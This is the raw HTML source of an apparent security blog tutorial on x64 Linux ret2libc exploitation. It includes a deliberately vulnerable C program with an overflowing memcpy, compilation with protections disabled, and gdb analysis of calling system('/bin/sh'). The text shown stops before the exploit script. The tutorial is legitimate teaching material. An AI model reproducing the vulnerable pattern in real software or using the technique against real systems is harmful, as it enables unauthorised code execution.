.search__close{position:absolute;top:50%;right:24px;transform:translateY(-50%);font-size:30px;line-height:1;color:rgba(238,238,238,0.5);transition:all .25s;cursor:pointer}.search__box .search__close:hover{color:#eee}@media only screen and (max-width: 768px){.search__box{width:80%;padding-top:100px}}@media only screen and (max-width: 576px){.search__box{width:90%}}.search__group{position:relative;margin-bottom:64px}.search__group .search__text{width:100%;height:auto;padding:16px 24px;font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",sans-serif;font-size:24px;font-weight:900;line-height:42px;border-radius:8px;border:4px solid rgba(238,238,238,0.1);transition:all .3s;color:#fff;background-color:transparent}.search__group .search__text::-webkit-input-placeholder{font-weight:900;color:rgba(238,238,238,0.8)}.search__group .search__text::placeholder{font-weight:900;color:rgba(238,238,238,0.8)}.search__group .search__text::-ms-clear{display:none}.search__group .search__text:focus{color:#eee;background:#09080f}@media only screen and (max-width: 576px){.search__group .search__text{font-size:26px}}.search-results-list .no-results{width:100%;list-style:none}.search-results-list .no-results h3{font-size:28px;text-align:center}.load-more{margin:0 auto}.load-more-section{margin:30px auto;text-align:center}@media only screen and (max-width: 576px){.load-more-section{margin:20px auto}}.footer-widgets{padding:64px 0 32px}.footer-widgets .row .col{flex-grow:1}@media only screen and (max-width: 768px){.footer-widgets{padding:48px 0 0}}.widget{margin-bottom:40px}@media only screen and (max-width: 768px){.widget{margin-bottom:64px}}.widget__title{position:relative;padding-left:8px;margin-bottom:36px;font-size:24px;line-height:1;color:#fff}.widget__title::after{content:"";position:absolute;left:0;top:50%;z-index:-1;transform:translateY(-50%);display:block;width:106px;height:38px;border-radius:4px 0px 0px 4px;background:linear-gradient(90deg, #900000 -5.19%, rgba(0,0,0,0) 100%)}@media only screen and (max-width: 992px){.widget__title{font-size:24px}}.recent-posts{display:flex;align-items:center;margin-bottom:20px}.recent-posts:last-child{margin-bottom:0}@media only screen and (max-width: 360px){.recent-posts{flex-wrap:wrap;margin-bottom:32px}}.recent-posts__image{position:relative;display:block;width:100%;max-width:174px;height:144px;margin-right:20px;border-radius:16px;overflow:hidden;background:#09080f}.recent-posts__image img{position:absolute;top:0;left:0;width:100%;height:100%;border-radius:16px;object-fit:cover}@media only screen and (max-width: 360px){.recent-posts__image{height:auto;max-width:100%;padding-top:56.6%;margin:0 0 20px}}.recent-posts__content .recent-posts__title{font-size:18px;margin:8px 0}.recent-posts__content .article__author-image{width:28px;height:28px}.tag__cloud{display:flex;flex-wrap:wrap}.tag__cloud a{display:inline-block;padding:8px 16px;margin:0 5px 5px 0;font-size:12px;line-height:10px;font-weight:700;text-transform:capitalize;border:3px solid rgba(255,255,255,0.1);border-radius:24px;color:#ccc}.tag__cloud a:hover{border-color:#900000;color:#fff}.subscribe-subtitle{width:100%;margin-bottom:24px;font-size:16px;line-height:24px;color:#ccc}.subscribe-group-top{display:flex;align-items:center}.subscribe-group-top .subscribe-email{position:relative;width:100%;height:56px;padding:20px;font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",sans-serif;font-size:14px;line-height:20px;font-weight:700;border-radius:8px;color:#fff;background-color:#17151E;border:2px solid transparent;outline:0;-webkit-appearance:none;box-sizing:border-box;transition:border-color .2s ease-in-out;cursor:text}.subscribe-group-top .subscribe-email::placeholder{color:#eee}.subscribe-group-top .subscribe-email:focus{color:#fff;border-color:#900000}.subscribe-group-top .subscribe-button{margin-left:10px}.footer{position:relative;padding:64px 0;border-top:2px solid #09080f}.footer .footer__inner{display:flex;justify-content:space-between;align-items:center}@media only screen and (max-width: 992px){.footer .footer__inner{flex-direction:column}.footer .footer__inner .copyright{order:1}}@media only screen and (max-width: 768px){.footer .footer__inner{align-items:flex-start}}.copyright{font-size:13px;color:#ccc}.copyright a{font-weight:500;color:#fff}.copyright a:hover{color:#900000}.social{text-align:center}.social .social__list{display:flex;flex-wrap:wrap;justify-content:center;align-items:center}.social .social__item{display:inline-block;margin-left:8px}.social .social__item:first-child{margin-left:0}.social .social__link{display:flex;justify-content:center;align-items:center;width:40px;height:40px;font-size:16px;line-height:40px;border-radius:8px;color:#fff;background-color:#17151E}.social .social__link:hover{color:#09080f;background-color:#900000}@media only screen and (max-width: 992px){.social{margin-bottom:5px}.social .social__item{margin-bottom:10px}.social .social__link{width:30px;height:30px;line-height:30px;font-size:16px}}.button{display:inline-block;white-space:nowrap;vertical-align:middle;font:inherit;border:none;border-radius:8px;outline:none;-webkit-appearance:none;text-align:center;text-decoration:none;color:#fff;transition:all 0.2s ease;cursor:pointer}.button:hover{color:#fff}.button--primary{padding:20px 40px;font-size:16px;font-weight:700;line-height:1;background-color:#17151E}.button--primary:hover{color:#09080f;background-color:#700}.button--middle{position:relative;padding:24px 48px;width:100%;max-width:412px;font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",sans-serif;font-size:12px;font-weight:700;letter-spacing:1px;text-transform:uppercase;transition:all .2s ease;background-color:#09080f}.button--middle:hover{background-color:#17151E}.button--big{display:block;width:100%}.article{align-items:stretch;flex-grow:1;min-height:340px;margin-bottom:32px;transition:transform .2s ease}.article::after{content:"";display:table;padding-top:25%}.article:hover{transform:translateY(-5px)}.article--big::after{padding-top:35%}@media only screen and (max-width: 992px){.article--big::after{padding-top:25%}}@media only screen and (max-width: 576px){.article{min-height:280px}}.article__inner{position:relative;display:flex;width:100%;height:100%;border-radius:16px;overflow:hidden;box-shadow:0 5px 10px 0 rgba(0,0,0,0.5);background-color:#09080f}.article__inner .featured-post{position:absolute;top:20px;right:32px;z-index:10;padding:2px 4px;font-size:20px;border-radius:4px;color:#ccc;background:rgba(255,255,255,0.08);pointer-events:none}@media only screen and (max-width: 576px){.article__inner .featured-post{right:20px}}.article__title{margin:12px 0 12px;font-size:28px;line-height:1}.article__title a{color:#eee}@media only screen and (max-width: 576px){.article__title{font-size:24px}}.article__excerpt{margin-bottom:12px;font-size:14px;line-height:17px;color:#ccc}@media only screen and (max-width: 576px){.article__excerpt{font-size:13px}}.article__image{position:absolute;display:block;width:100%;height:100%;overflow:hidden;user-select:none;background-color:#09080f}.article__image::after{content:"";display:block;position:absolute;top:0;left:0;width:100%;height:100%;background-color:rgba(0,0,0,0.6);pointer-events:none}.article__image img{position:absolute;top:0;width:100%;height:100%;object-fit:cover;border-radius:16px;pointer-events:none}.article__content{z-index:1;width:100%;margin-top:auto;padding:0 32px 32px;pointer-events:none}@media only screen and (max-width: 576px){.article__content{padding:20px}}.article__meta{line-height:12px}.article__meta .article__date,.article__meta .article__minutes{font-size:12px;line-height:1;font-weight:500}.article__meta .article__date{color:#ccc}.article__bottom{display:flex;align-items:center;font-size:12px;line-height:18px;font-weight:500;color:#fff}.article__bottom a{pointer-events:all}.article-tags .article__tag{display:inline-block;padding:4px 8px;margin:2px 0;font-size:12px;line-height:10px;font-weight:500;text-transform:capitalize;letter-spacing:-0.5px;border:2px solid rgba(255,255,255,0.4);border-radius:24px;color:#ccc}.article-tags .article__tag:hover{color:#fff;border-color:#900000}.article__author{float:left;flex-shrink:0}.article__author-image{position:relative;display:inline-block;width:36px;height:36px;padding:3px;margin-right:8px;border:2px solid #900000;border-radius:50%;overflow:hidden}.article__author-image img{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover}.article__author-link{font-size:12px;color:#fff}.article__author-link:hover{color:#fff}.article__author span{color:rgba(255,255,255,0.8)}.post,.page{position:relative;max-width:900px;margin:0 auto}.post-head{margin-bottom:64px}.post-head .row{align-items:center}.post-head .post-head__box{margin-left:32px}@media only screen and (max-width: 992px){.post-head .post-head__box{margin-left:16px}}@media only screen and (max-width: 768px){.post-head{margin-bottom:40px}.post-head .post-head__box{margin-left:0}.post-head .row{flex-direction:column}}.post-image{position:absolute;top:0;left:0;width:100%;height:100%;border-radius:16px;object-fit:cover}.image-box{position:relative;padding-top:90%;min-height:280px;border-radius:16px;overflow:hidden;box-shadow:0 5px 10px 0px rgba(0,0,0,0.15);background-color:#09080f}@media only screen and (max-width: 768px){.image-box{padding-top:65%;margin-bottom:40px}}.post__meta{line-height:13px}.post__meta .post__date,.post__meta .post__minutes{font-size:13px;line-height:1;font-weight:500}.post__meta .post__date{color:#ccc}.post__title{margin:20px 0 20px;font-size:56px;line-height:1}@media only screen and (max-width: 1200px){.post__title{font-size:40px}}@media only screen and (max-width: 576px){.post__title{font-size:32px}}.post__bottom{display:flex;align-items:center;font-size:13px;line-height:30px;font-weight:500;color:#fff}.post-tags .post__tag{padding:4px 8px;margin:2px 0;font-size:12px;line-height:10px;font-weight:700;border:2px solid rgba(255,255,255,0.2);border-radius:24px;color:#ccc}.post-tags .post__tag:hover{color:#fff;border-color:#900000}.post__author{float:left;flex-shrink:0}.post__author-image{position:relative;display:inline-block;width:36px;height:36px;padding:3px;margin-right:8px;border:2px solid #900000;border-radius:50%;overflow:hidden}.post__author-image img{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover}.post__author-link{font-size:13px;color:#fff}.post__author-link:hover{color:#fff}.post__author span{color:rgba(255,255,255,0.8)}.post__content,.page__content{color:#ccc}.post__content a,.page__content a{border-bottom:2px solid rgba(238,238,238,0.1)}.post__content a:hover,.page__content a:hover{border-color:#900000;color:#eee;text-decoration:none}.post__share{display:flex;justify-content:center;margin:64px 0}.post__share .share__list{display:inline-flex;justify-content:center;align-items:center;border-radius:16px;background:#17151E}.post__share .share__list .share__link{position:relative;display:flex;justify-content:center;align-items:center;padding:28px 24px;font-size:20px;color:#eee;transition:all .2s}.post__share .share__list .share__link:first-child{padding-left:48px}.post__share .share__list .share__link:first-child::after{content:none}.post__share .share__list .share__link:last-child{padding-right:48px}.post__share .share__list .share__link::after{content:"";position:absolute;left:0;display:block;width:1px;height:12px;background:rgba(238,238,238,0.08)}.post__share .share__list .share__link:hover{color:#900000}@media only screen and (max-width: 576px){.post__share{margin:48px 0}.post__share .share__list .share__link{padding:24px 20px}.post__share .share__list .share__link:first-child{padding-left:40px}.post__share .share__list .share__link:last-child{padding-right:40px}}.post__navigation{display:flex;justify-content:space-between;margin-bottom:64px;box-shadow:0 5px 10px 0 rgba(0,0,0,0.5);border-radius:16px}.post__navigation .prev,.post__navigation .prev img{border-radius:16px 0 0 16px}.post__navigation .next,.post__navigation .next img{border-radius:0 16px 16px 0}.post__navigation .prev,.post__navigation .next{position:relative;display:flex;align-items:flex-end;width:100%;min-height:240px;padding:0 32px 32px;overflow:hidden;background-size:cover;background-position:center;background-repeat:no-repeat;background-color:#09080f;user-select:none}.post__navigation .prev::after,.post__navigation .next::after{content:"";display:block;position:absolute;top:0;left:0;width:100%;height:100%;background-color:rgba(9,8,15,0.6);pointer-events:none;transition:.25s}.post__navigation .prev:hover::after,.post__navigation .next:hover::after{background-color:rgba(9,8,15,0.7)}.post__navigation .prev .post__nav,.post__navigation .next .post__nav{display:inline-block;margin-bottom:8px;font-size:12px;font-weight:500;text-transform:uppercase;color:#eee}.post__navigation .prev .post__nav-image,.post__navigation .next .post__nav-image{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover}.post__navigation .prev .post__nav-box,.post__navigation .next .post__nav-box{position:relative;z-index:1;width:100%}.post__navigation .prev .post__nav__prev i,.post__navigation .next .post__nav__prev i{margin-right:4px}.post__navigation .prev .post__nav__next i,.post__navigation .next .post__nav__next i{margin-left:4px}.post__navigation .prev .post__nav__title,.post__navigation .next .post__nav__title{margin-bottom:0;font-size:24px;line-height:1}.post__navigation .prev .post__nav__title a,.post__navigation .next .post__nav__title a{color:#eee}.post__navigation .next{text-align:right;margin-left:auto}@media only screen and (max-width: 768px){.post__navigation{flex-wrap:wrap;box-shadow:none}.post__navigation .prev,.post__navigation .next{width:100%;border-radius:16px;box-shadow:0 5px 10px 0 rgba(0,0,0,0.5)}.post__navigation .prev img,.post__navigation .next img{border-radius:16px}.post__navigation .prev{margin-bottom:20px}}@media only screen and (max-width: 576px){.post__navigation{margin-bottom:48px}}.related-posts{display:none}.related-posts.is-related{display:block}.related-posts .related-title{position:relative;padding-left:8px;margin-bottom:36px;font-size:24px;line-height:1;color:#fff}.related-posts .related-title::after{content:"";position:absolute;left:0;top:50%;z-index:-1;transform:translateY(-50%);display:block;width:106px;height:38px;border-radius:4px 0px 0px 4px;background:linear-gradient(90deg, #900000 -5.19%, rgba(0,0,0,0) 100%)}@media only screen and (max-width: 992px){.related-posts .related-title{font-size:24px}}.disqus-inner{border-radius:16px;background:#17151E}.post-comments{max-width:824px;padding:64px 32px;margin:0 auto}@media only screen and (max-width: 576px){.post-comments{padding:48px 32px}}.archive-box{position:relative;margin:50px 0 80px;text-align:center}@media only screen and (max-width: 576px){.archive-box{margin:20px 0 50px}}.archive-meta{font-size:16px;color:rgba(238,238,238,0.6)}.archive-title{position:relative;margin:0;font-size:47px;line-height:57px;text-transform:capitalize}@media only screen and (max-width: 576px){.archive-title{font-size:40px;line-height:52px}}.archive-description{max-width:600px;margin:10px auto 0;font-size:16px;line-height:32px}@media only screen and (max-width: 576px){.archive-description{margin:5px auto 0;line-height:28px}}.form__group{margin-bottom:20px}.form__input{width:100%;padding:20px;font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",sans-serif;font-size:16px;font-weight:700;border:2px solid transparent;border-radius:8px;color:#eee;background:#17151E;transition:border-color .2s ease-in-out}.form__input::placeholder{color:#fff}.form__input:focus{border-color:#900000}textarea{resize:vertical}
+
+  </style>
+</head>
+
+
+<body>
+  
+
+  
+
+<!-- begin header -->
+<header class="header ">
+  <div class="container">
+    <div class="row">
+      <div class="header__inner col col-12">
+
+      <div class="logo">
+        <a class="logo__link" href="/">
+        
+          <img class="logo__image" src="/images/logoyeni2.png" alt=":~$ Knuckle$ecurity_">
+        
+        </a>
+      </div>
+        
+      <div class="menu-overlay">
+        <nav class="main-nav">
+          <div class="main-nav__box">
+            <div class="nav__icon-close">
+              <i class="ion ion-md-close"></i>
+            </div>
+            <div class="nav-grid">
+              <div class="nav-grid__item">
+                <h2 class="nav-grid__title">Menu</h2>
+                <div class="mobile-nav">
+                  <ul class="nav__list list-reset">
+  <li class="nav__item">
+    <a href="/" class="nav__link">Home</a>
+  </li>
+  
+    
+  
+    
+      
+      <li class="nav__item">
+        <a href="/contact/" class="nav__link">Contact Me</a>
+      </li>
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+      <li class="nav__item">
+        <a href="/socials/" class="nav__link">Socials</a>
+      </li>
+      
+    
+  
+    
+      
+      <li class="nav__item">
+        <a href="/tag/tryhackme-machines/" class="nav__link">THM</a>
+      </li>
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+</ul>
+                </div>
+              </div>
+            </div>
+          </div>
+        </nav>
+      </div>
+
+      <div class="navigation">
+        <div class="top-nav">
+          <ul class="nav__list list-reset">
+  <li class="nav__item">
+    <a href="/" class="nav__link">Home</a>
+  </li>
+  
+    
+  
+    
+      
+      <li class="nav__item">
+        <a href="/contact/" class="nav__link">Contact Me</a>
+      </li>
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+      <li class="nav__item">
+        <a href="/socials/" class="nav__link">Socials</a>
+      </li>
+      
+    
+  
+    
+      
+      <li class="nav__item">
+        <a href="/tag/tryhackme-machines/" class="nav__link">THM</a>
+      </li>
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+</ul>
+        </div>
+      </div>
+
+      <div class="nav-buttons">
+        <i class="nav__icon nav__icon-menu ion ion-md-menu"></i>
+        <div class="search-button">
+          <i class="nav__icon nav__icon-search ion ion-md-search"></i>
+          <span>Search</span>
+        </div>
+      </div>
+
+      </div>
+    </div>
+  </div>
+</header>
+<!-- end header -->
+
+<!-- begin search -->
+<div class="search">
+  <div class="container">
+    <div class="row">
+      <div class="col col-12">
+        <div class="search__box">
+          <div class="search__group">
+            <div class="search__close">
+              <i class="ion ion-md-close"></i>
+            </div>
+            <label for="js-search-input" class="screen-reader-text">Search for Blog</label>
+            <input type="text" id="js-search-input" class="search__text" autocomplete="off" placeholder="Type to search...">
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="row search-results-list" id="js-results-container"></div>
+  </div>
+
+</div>
+<!-- end search -->
+
+  <!-- begin content -->
+  <main class="content" aria-label="Content">
+    <div class="post-head">
+  <div class="container">
+    <div class="row">
+      
+      <div class="col col-6 col-t-12">
+        <div class="image-box">
+          <img class="post-image lazy" data-src="/assets/img/posts/stack-based-overflows-on-64bit-linux/banner.png" alt="X64 Linux Binary Exploitation Part 2 Ret2Libc">
+        </div>
+      </div>
+      
+  
+      <div class="col col-6 col-t-12">
+        <div class="post-head__box">
+        
+          <div class="post__meta">
+            <span class="post__minutes">
+              
+              
+                24 min read
+              
+              <time class="post__date"
+                datetime="2022-12-10T22:20:00+00:00">Dec 10, 2022</time>
+            </span>
+          </div>
+        
+          <h2 class="post__title">X64 Linux Binary Exploitation Part 2 Ret2Libc</h2>
+        
+          <div class="post__bottom">
+        
+            <div class="post__author">
+              <a href="/about/" aria-label="Burak Baris"><img class="post__author-image"
+                  src="/images/avatar.png" alt="Burak Baris's Picture"></a>
+            </div>
+        
+            <div class="post__bottom-meta">
+              <a href="/about/" class="post__author-link">Burak Baris</a>
+              
+              <span>in</span>
+              <span class="post-tags">
+                
+                <a href="/tag/c" class="post__tag">c</a>
+                
+                <a href="/tag/assembly" class="post__tag">assembly</a>
+                
+                <a href="/tag/x86" class="post__tag">x86</a>
+                
+                <a href="/tag/32-bit" class="post__tag">32-bit</a>
+                
+                <a href="/tag/memory-segmentation" class="post__tag">memory-segmentation</a>
+                
+                <a href="/tag/memory-segmentation" class="post__tag">memory-segmentation</a>
+                
+                <a href="/tag/buffer-overflows" class="post__tag">buffer-overflows</a>
+                
+              </span>
+              
+            </div>
+          </div>
+        
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- begin post -->
+<div class="container">
+  <article class="post animate">
+
+    <div class="post__content">
+      <p>In the previous post we have learned a general understanding on how registers, stack and the memory works 
+when a binary is being executed. Furthermore, I have explained how to exploit a misconstrued C code and 
+execute a shell code with using the stack.</p>
+
+<p>As you remember, when compiling the vulnerable C code, I have deactivated some built-in protection mechanisms 
+that the compiler applies. I also said I will activate those step-by-step. In this paper, I will disable a 
+stack protection mechanism called No eXecute (NX Bit) bit.</p>
+
+<h1 id="no-execute-nx-bit">No eXecute (NX Bit)</h1>
+<p>The No eXecute or the NX bit (also known as Data Execution Prevention or DEP) marks certain areas of the 
+binary as not executable. Therefore the stored input or data cannot be executed as code. 
+This is significant because it prevents attackers from being able to jump to custom 
+shellcode that they’ve stored on the stack or in a global variable.</p>
+
+<p>When we compiled the source code in the previous paper, I passed <strong>-z execstack</strong> argument to the compiler, which 
+makes the stack segment of the program executable. Therefore, when we inject shell code into the buffer, we could 
+run it by making the RIP point to the starting address of our shell code.</p>
+
+<p>Since it is not possible to execute the shell code into the buffer when the NX bit is activated,
+we will have to find a way to walk around that protection. We will still be modifying the RIP as we did before, 
+however, in order to bypass that guard, we will not be pointing to the stack but to a different memory location.</p>
+
+<ul>
+  <li>
+    <h1 id="vulnerable-code">Vulnerable Code</h1>
+  </li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">);</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">){</span>
+    <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+  <span class="p">};</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">){</span>
+  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+  <span class="n">memcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="mi">300</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This is the vulnerable code I will be using in this demo. The code we will use here is almost identical to the previous one
+with one little tweak. Instead of using strcpy() this time I will be using memcpy() function. I will explain why I made this 
+decision in the following sections but for now, to sum up, strcpy() has a built-in mechanism called <strong>null terminator</strong>.
+We do not want that. Do not worry, I will be explaining it in much detail.</p>
+
+<p>memcpy() function simply takes a destination buffer as it’s first argument and a source pointer as its second.
+The third argument declares how many bytes will be written into the destination buffer read from the source.</p>
+
+<ul>
+  <li>
+    <h1 id="checking-the-nx-bit">Checking the NX bit</h1>
+    <p>Let’s compile it.</p>
+  </li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">KnuckleSecurity :: -&gt; gcc <span class="nt">-no-pie</span> <span class="nt">-fno-stack-protector</span> ret2libc.c <span class="nt">-o</span> ret2libc.elf <span class="nt">-D_FORTIFY_SOURCE</span><span class="o">=</span>0 <span class="nt">-g</span>
+ret2libc.c: In <span class="k">function</span> ‘vuln’:
+ret2libc.c:18:3: warning: ‘memcpy’ writing 300 bytes into a region of size 256 overflows the destination <span class="o">[</span><span class="nt">-Wstringop-overflow</span><span class="o">=]</span>
+   18 |   memcpy<span class="o">(</span>buffer, input, 300<span class="o">)</span><span class="p">;</span>
+      |   ^~~~~~~~~~~~~~~~~~~~~~~~~~
+ret2libc.c:17:8: note: destination object ‘buffer’ of size 256
+   17 |   char buffer[256]<span class="p">;</span>
+      |        ^~~~~~</code></pre></figure>
+
+<p>As you can see this time we do not pass the <strong>-z execstack</strong> argument. Therefore, the stack is no longer executable and we 
+no longer can execute any code in the stack segment.
+Furthermore you can see the compiler screaming that it is not safe to write 300 bytes into a 256 byte array. Good for you compiler, 
+we do not care.</p>
+
+<p>I will be disabling <strong>-fno-stack-protector –no-pie</strong> and the <strong>-D_FORTIFY_SOURCE</strong> protections in the following papers.</p>
+
+<p>Let’s check the NX bit.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">KnuckleSecurity :: -&gt; gdb <span class="nt">-q</span> ret2libc.elf
+GEF <span class="k">for </span>linux ready, <span class="nb">type</span> <span class="sb">`</span>gef<span class="s1">' to start, `gef config'</span> to configure
+90 commands loaded and 5 functions added <span class="k">for </span>GDB 12.1 <span class="k">in </span>0.00ms using Python engine 3.10
+Reading symbols from ret2libc.elf...
+gef➤  checksec
+<span class="o">[</span>+] checksec <span class="k">for</span> <span class="s1">'/home/burak/programming/reverse/ret2libc.elf'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> .gdbinit-gef.py:L8764 <span class="s1">'checksec'</span> is deprecated and will be removed <span class="k">in </span>a feature release. Use Elf<span class="o">(</span>fname<span class="o">)</span>.checksec<span class="o">()</span>
+Canary                        : ✘
+NX                            : ✓ <span class="c"># &lt;-- It is enabled. Stack is not executable.</span>
+PIE                           : ✘
+Fortify                       : ✘
+RelRO                         : Partial</code></pre></figure>
+
+<h1 id="what-is-libc">What is libc?</h1>
+<p>The term “libc” is commonly used as a shorthand for the “standard
+C library”, a library of standard functions that can be used by
+all C programs (and sometimes by programs in other languages).
+Because of some history, use of the term “libc” to
+refer to the standard C library on Linux.</p>
+
+<h1 id="attack-vector">Attack Vector</h1>
+
+<p>Recall how you’re including external libraries in order to use the functions you did not 
+manually define. libc contains both normal and system call functions within. We know the stack is not executable, but the 
+.text segment has to be executable. Since .text segment contains the compiled machine instructions we write, we can set the EIP 
+to point to the any instruction we think it is useful to us stored in the text segment.</p>
+
+<p>The trick is this; when the source code
+includes a header file such as <strong>&lt;stdlib.h&gt;</strong> in order to use <strong>exit()</strong> function for instance, it also loads the assembled 
+machine instructions of all 
+the other functions comes with the <strong>&lt;stdlib.h&gt;</strong> library into the memory regardless of whether they’re being called or not.
+For instance, in that library, 
+there is a function defined as <strong>system()</strong> which executes the first argument given to it in the shell, which is useful.
+Therefore, if we can 
+point to that function and somehow pass the parameter we want to execute, we can abuse it to execute a shell.</p>
+
+<p>In this demo our aim is to call the <strong>system()</strong> function and pass the <strong>/bin/sh</strong> to it by abusing the memcpy().</p>
+
+<p>So let’s first try to understand how the system() function executes /bin/sh.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">KnuckleSecurity :: -&gt; gcc system.c <span class="nt">-o</span> system.elf
+KnuckleSecurity :: -&gt; gdb <span class="nt">-q</span> system.elf
+GEF <span class="k">for </span>linux ready, <span class="nb">type</span> <span class="sb">`</span>gef<span class="s1">' to start, `gef config'</span> to configure
+90 commands loaded and 5 functions added <span class="k">for </span>GDB 12.1 <span class="k">in </span>0.00ms using Python engine 3.10
+Reading symbols from system.elf...
+gef➤  disassemble main
+Dump of assembler code <span class="k">for function </span>main:
+   0x0000000000001139 &lt;+0&gt;:     push   rbp
+   0x000000000000113a &lt;+1&gt;:     mov    rbp,rsp
+   0x000000000000113d &lt;+4&gt;:     lea    rax,[rip+0xec0]        <span class="c"># 0x2004</span>
+   0x0000000000001144 &lt;+11&gt;:    mov    rdi,rax
+   0x0000000000001147 &lt;+14&gt;:    call   0x1030 &lt;system@plt&gt;
+   0x000000000000114c &lt;+19&gt;:    mov    eax,0x0
+   0x0000000000001151 &lt;+24&gt;:    pop    rbp
+   0x0000000000001152 &lt;+25&gt;:    ret
+End of assembler dump.
+gef➤  x/s 0x2004
+0x2004: <span class="s2">"/bin/sh"</span></code></pre></figure>
+
+<p>First, main function completes its procedure prologue. And then writes the effective address of where the 
+<strong>/bin/sh</strong> string is stored to the accumulator. In the next step the accumulator is being copied to the 
+destination index. And finally program calls for the system(). As you remember from the previous paper, 
+you should be familiar with this function invocation. It is SysV calling convention. The RDI holds the value of 
+the first argument given to the function before its call. Therefore, we now have a plan. We should 
+somehow write to the RDI and set the RIP to the starting address of the system(), and that way we can 
+spawn a shell.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>Step by step we will build a Python script to spawn a shell.</p>
+
+<ul>
+  <li>
+    <h1 id="finding-the-library">Finding the library</h1>
+  </li>
+</ul>
+
+<p>Before moving on, we first we need to find out in what address libc’s first instruction is being loaded 
+in the program’s .text segment. We can list dynamic dependencies with <strong>ldd</strong> command in linux.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">KnuckleSecurity :: -&gt; ldd ret2libc.elf
+        linux-vdso.so.1 <span class="o">(</span>0x00007ffff7fc8000<span class="o">)</span>
+        libc.so.6 <span class="o">=&gt;</span> /usr/lib/libc.so.6 <span class="o">(</span>0x00007ffff7dbe000<span class="o">)</span> <span class="c"># &lt;-- libc base address</span>
